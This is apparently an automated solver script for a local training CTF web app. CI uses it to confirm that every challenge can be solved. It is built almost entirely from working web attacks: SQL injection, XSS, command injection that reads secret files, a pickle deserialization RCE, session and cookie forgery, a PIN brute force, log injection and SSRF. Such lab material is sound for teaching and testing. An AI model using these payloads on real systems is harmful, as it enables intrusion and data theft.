#!/usr/bin/env python3
"""SPOILERS! Automated solver for every Tehut Security CTF challenge (Pixel Palace Arcade).

Used by CI to prove every challenge is solvable. Standard library only.

    python3 solutions/solve_all.py                 # find all flags, print them
    python3 solutions/solve_all.py --submit        # ...and submit them to HQ
    python3 solutions/solve_all.py --url http://127.0.0.1:5000
"""
import argparse
import base64
import hashlib
import json
import pickle
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor

FLAG_RE = re.compile(r"FLAG\{[A-Za-z0-9_]+\}")


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **kw):
        return None


_opener = urllib.request.build_opener(_NoRedirect)


class Client:
    """Tiny HTTP client with a manual cookie jar (so we can forge cookies)."""

    def __init__(self, base, cookies=None):
        self.base = base.rstrip("/")
        self.cookies = dict(cookies or {})

    def req(self, path, data=None, json_body=None):
        headers = {}
        if self.cookies:
            headers["Cookie"] = "; ".join("%s=%s" % kv for kv in self.cookies.items())
        body = None
        if json_body is not None:
            body = json.dumps(json_body).encode()
            headers["Content-Type"] = "application/json"
        elif data is not None:
            body = urllib.parse.urlencode(data).encode()
        r = urllib.request.Request(self.base + path, data=body, headers=headers)
        # Retries with backoff: Docker port forwarding (notably on WSL) can reset
        # connections during the PIN brute force.
        for attempt in range(8):
            try:
                resp = _opener.open(r, timeout=15)
                break
            except urllib.error.HTTPError as e:
                resp = e
                break
            except (ConnectionError, urllib.error.URLError):
                if attempt == 7:
                    raise
                time.sleep(min(0.25 * 2 ** attempt, 4))
        for c in resp.headers.get_all("Set-Cookie") or []:
            k, v = c.split(";", 1)[0].split("=", 1)
            self.cookies[k] = v.strip('"')
        return resp.read().decode("utf-8", "replace")

    def login(self, user, pw):
        self.req("/login", {"username": user, "password": pw})
        return self


def md5(s):
    return hashlib.md5(s.encode()).hexdigest()


def first_flag(text):
    m = FLAG_RE.search(text)
    return m.group(0) if m else None


def xss_flag(c, html):
    m = re.search(r'var token = "([0-9a-f]+)"', html)
    if not m:
        return None
    return json.loads(c.req("/hq/api/xss", json_body={"token": m.group(1)})).get("flag")


class PickleRCE:
    def __reduce__(self):
        return (subprocess.check_output, (["cat", "data/secrets/pickle_flag.txt"],))


def solve(base, internal_port=None):
    intern = lambda: Client(base).login("intern", "intern")  # noqa: E731
    me = intern()
    port = internal_port or urllib.parse.urlparse(base).port or 80
    out = {}

    out["a01_idor"] = first_flag(me.req("/profile?id=2"))
    out["a01_api"] = first_flag(Client(base).req("/api/v1/admin/users"))
    out["a01_csrf"] = first_flag(me.req("/support", {
        "message": 'Check out my high score! <img src="/gift?to=intern&amount=1000">'}))

    dump = Client(base).req("/backup/pixelpalace_staff_2026-03.sql.bak")
    owner_hash = re.search(r"'owner', '([0-9a-f]{32})'", dump).group(1)
    wordlist = ["123456", "password", "qwerty", "iloveyou", "princess", "sunshine", "monkey"]
    owner_pw = next(w for w in wordlist if md5(w) == owner_hash)
    out["a02_crack"] = first_flag(Client(base).login("owner", owner_pw).req("/account"))

    q = urllib.parse.quote("' UNION SELECT id,label,secret FROM cheat_codes--")
    out["a03_sqli"] = first_flag(me.req("/search?q=" + q))

    html = me.req("/hello?name=" + urllib.parse.quote("<script>alert(1)</script>"))
    assert "<script>alert(1)</script>" in html, "payload not reflected"
    out["a03_xss_reflected"] = xss_flag(me, html)

    me.req("/comments", {"content": "<img src=x onerror=alert(1)>"})
    out["a03_xss_stored"] = xss_flag(me, me.req("/comments"))
    me.req("/comments/clear", {})

    host = urllib.parse.quote("$(cat data/secrets/ping_flag.txt)")
    out["a03_cmd"] = first_flag(me.req("/tools/ping?host=" + host))

    me.req("/reset", {"username": "alice"})
    out["a04_reset"] = first_flag(me.req("/reset/confirm", {
        "user": "alice", "token": md5("alice"), "new_password": "pwned"}))

    out["a04_logic"] = first_flag(me.req("/gift?to=admin&amount=-1000000"))
    out["a05_debug"] = first_flag(me.req("/profile?id=banana"))
    out["a06_tpl"] = first_flag(me.req("/tools/card", {"template": "{{ app.config }}"}))
    out["a07_session"] = first_flag(Client(base, {"sessid": md5("admin")}).req("/account"))

    def try_pin(i):
        return first_flag(Client(base).req("/locker", {"pin": "%04d" % i}))
    with ThreadPoolExecutor(8) as pool:
        out["a07_brute"] = next((f for f in pool.map(try_pin, range(10000)) if f), None)

    gold = base64.b64encode(json.dumps({"user": "intern", "tier": "gold"}).encode()).decode()
    out["a08_cookie"] = first_flag(Client(base, {"membership": gold}).req("/vip"))

    payload = base64.b64encode(pickle.dumps(PickleRCE())).decode()
    out["a08_pickle"] = first_flag(me.req("/settings/import", {"data": payload}))

    Client(base).req("/login", {"username": "x\n2026-01-01 00:00:00 LOGIN SUCCESS user=admin",
                                "password": "x"})
    out["a09_loginject"] = first_flag(Client(base).req("/logs"))

    url = urllib.parse.quote("http://127.1:%d/internal/metadata" % port)
    out["a10_ssrf"] = first_flag(me.req("/tools/preview?url=" + url))

    out["bonus_konami"] = json.loads(Client(base).req("/hq/api/konami", json_body={}))["flag"]
    return out


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", default="http://127.0.0.1:5000")
    ap.add_argument("--submit", action="store_true", help="submit flags to Tehut HQ")
    ap.add_argument("--internal-port", type=int, help="port the app listens on inside Docker (for SSRF)")
    args = ap.parse_args()

    flags = solve(args.url, args.internal_port)
    hq = Client(args.url)
    failed = 0
    for key, f in flags.items():
        status = "MISSING"
        if f:
            status = "found"
            if args.submit:
                ok = json.loads(hq.req("/hq/api/submit", json_body={"flag": f})).get("ok")
                status = "submitted" if ok else "REJECTED"
        failed += status in ("MISSING", "REJECTED")
        print("%-18s %-10s %s" % (key, status, f or ""))
    print("\n%d/%d challenges solved" % (len(flags) - failed, len(flags)))
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
